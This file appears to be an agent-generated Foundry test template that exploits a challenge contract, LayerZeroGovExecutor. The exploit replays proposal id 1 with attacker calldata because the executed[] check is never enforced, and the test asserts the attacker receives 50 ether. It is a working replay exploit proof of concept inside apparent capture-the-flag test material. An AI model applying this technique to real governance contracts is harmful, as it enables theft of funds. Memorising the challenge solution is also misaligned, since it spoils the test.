// SPDX-License-Identifier: MIT
// AGENT-GENERATED harness: {{STRATEGY_ID}} on {{CHALLENGE_NAME}}.
// Technique: executed[] is recorded but never enforced, and the key is the
// proposal id alone — so an attacker forges a peer-consistent origin with the
// SAME id but attacker calldata, and the executor runs it.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {LayerZeroGovExecutor} from "../../src/challenges/LayerZeroGovExecutor.sol";

contract {{TEST_CONTRACT}} is Test {
    function test_agentSolve() public {
        vm.deal(address(this), 200 ether);
        address attacker = makeAddr("govAttacker");
        LayerZeroGovExecutor gov = new LayerZeroGovExecutor{value: 100 ether}(30101, bytes32(uint256(uint160(0x6055))));

        // Honest proposal 1 executes.
        gov.lzReceive(
            LayerZeroGovExecutor.Origin(30101, bytes32(uint256(uint160(0x6055))), 1),
            bytes32(0),
            abi.encode(uint256(1), address(0xC0FFEE), uint256(10 ether), bytes("")),
            address(this),
            ""
        );

        // Attacker's variant of "proposal 1": id collides, payload differs.
        gov.lzReceive(
            LayerZeroGovExecutor.Origin(30101, bytes32(uint256(uint160(0x6055))), 2),
            bytes32(0),
            abi.encode(uint256(1), attacker, uint256(50 ether), bytes("")),
            address(this),
            ""
        );

        assertEq(attacker.balance, 50 ether, "id collision must execute evil variant");
        console2.log("[PROFIT_WEI]", attacker.balance);
    }
}
